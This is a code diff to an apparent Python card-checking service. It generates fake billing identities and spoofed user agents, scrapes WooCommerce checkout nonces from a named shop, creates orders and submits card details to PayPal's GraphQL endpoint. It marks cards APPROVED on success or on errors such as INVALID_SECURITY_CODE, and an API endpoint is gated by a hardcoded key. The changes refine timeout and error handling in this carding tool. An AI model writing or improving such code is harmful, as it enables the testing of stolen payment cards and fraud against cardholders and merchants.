@@ -54,7 +54,7 @@ def check_card(card_details):
         user = user_agent.generate_user_agent()
         r = requests.session()
 
-        # Generate fake billing info
+        # Fake billing info
         first_name, last_name = generate_full_name()
         city, state, street_address, zip_code = generate_address()
         acc = generate_random_account()
@@ -67,20 +67,24 @@ def check_card(card_details):
                 'https://switchupcb.com/shop/i-buy/',
                 headers={'user-agent': user, 'content-type': multipart_data.content_type},
                 data=multipart_data,
-                timeout=10
+                timeout=(5, 10)
             )
-        except requests.exceptions.Timeout:
-            return {"message": "❌DECLINED", "response_text": "ERROR: TIMEOUT_AT_CART"}
+        except requests.exceptions.ConnectTimeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: CONNECT_TIMEOUT_CART"}
+        except requests.exceptions.ReadTimeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: READ_TIMEOUT_CART"}
         except requests.exceptions.RequestException as e:
-            return {"message": "❌DECLINED", "response_text": f"ERROR: {str(e)}"}
+            return {"message": "❌DECLINED", "response_text": f"ERROR: CART_REQUEST_FAILED {str(e)}"}
 
         # 2. Get checkout tokens
         try:
-            response_checkout = r.get('https://switchupcb.com/checkout/', headers={'user-agent': user}, timeout=10)
+            response_checkout = r.get('https://switchupcb.com/checkout/', headers={'user-agent': user}, timeout=(5, 10))
             check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response_checkout.text).group(1)
             create = re.search(r'create_order.*?nonce":"(.*?)"', response_checkout.text).group(1)
-        except requests.exceptions.Timeout:
-            return {"message": "❌DECLINED", "response_text": "ERROR: TIMEOUT_AT_CHECKOUT"}
+        except requests.exceptions.ConnectTimeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: CONNECT_TIMEOUT_CHECKOUT"}
+        except requests.exceptions.ReadTimeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: READ_TIMEOUT_CHECKOUT"}
         except Exception:
             return {"message": "❌DECLINED", "response_text": "ERROR: SCRAPE_FAILED"}
 
@@ -98,11 +102,13 @@ def check_card(card_details):
                 'https://switchupcb.com/?wc-ajax=ppc-create-order',
                 json=json_data_create,
                 headers={'user-agent': user},
-                timeout=10
+                timeout=(5, 10)
             )
             order_data = response_create.json()
-        except requests.exceptions.Timeout:
-            return {"message": "❌DECLINED", "response_text": "ERROR: TIMEOUT_AT_CREATE_ORDER"}
+        except requests.exceptions.ConnectTimeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: CONNECT_TIMEOUT_CREATE_ORDER"}
+        except requests.exceptions.ReadTimeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: READ_TIMEOUT_CREATE_ORDER"}
         except Exception:
             return {"message": "❌DECLINED", "response_text": "ERROR: ORDER_JSON_FAILED"}
 
@@ -123,11 +129,13 @@ def check_card(card_details):
                 'https://www.paypal.com/graphql?fetch_credit_form_submit',
                 headers={'user-agent': user, 'content-type': 'application/json'},
                 json=json_data_graphql,
-                timeout=10
+                timeout=(5, 10)
             )
             raw_json = response_final.json()
-        except requests.exceptions.Timeout:
-            return {"message": "❌DECLINED", "response_text": "ERROR: TIMEOUT_AT_PAYPAL"}
+        except requests.exceptions.ConnectTimeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: CONNECT_TIMEOUT_PAYPAL"}
+        except requests.exceptions.ReadTimeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: READ_TIMEOUT_PAYPAL"}
         except Exception:
             raw_json = {}
 
@@ -152,12 +160,12 @@ def check_card(card_details):
             error_text = "ERROR: PARSE_FAILED"
 
         # --- Decide clean message ---
-        if any(x in response_final.text for x in ["succeeded", "Thank You", "ADD_SHIPPING_ERROR",
-                                                  "INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED",
-                                                  "INVALID_BILLING_ADDRESS"]):
+        if "succeeded" in response_final.text or "Thank You" in response_final.text:
             return {"message": "✅APPROVED", "response_text": error_text}
-        else:
-            return {"message": "❌DECLINED", "response_text": error_text}
+        if any(x in response_final.text for x in ["ADD_SHIPPING_ERROR", "INVALID_SECURITY_CODE",
+                                                  "EXISTING_ACCOUNT_RESTRICTED", "INVALID_BILLING_ADDRESS"]):
+            return {"message": "✅APPROVED", "response_text": error_text}
+        return {"message": "❌DECLINED", "response_text": error_text}
 
     except Exception as e:
         return {"message": "❌DECLINED", "response_text": f"ERROR: {str(e)}"}
@@ -169,7 +177,6 @@ def api_check():
     gateway = request.args.get('gateway')
     key = request.args.get('key')
 
-    # Key validation
     if key != "payalismy":
         return jsonify({"message": "ACCESS DENIED ❌", "response_text": "ERROR: INVALID_KEY"}), 403
 
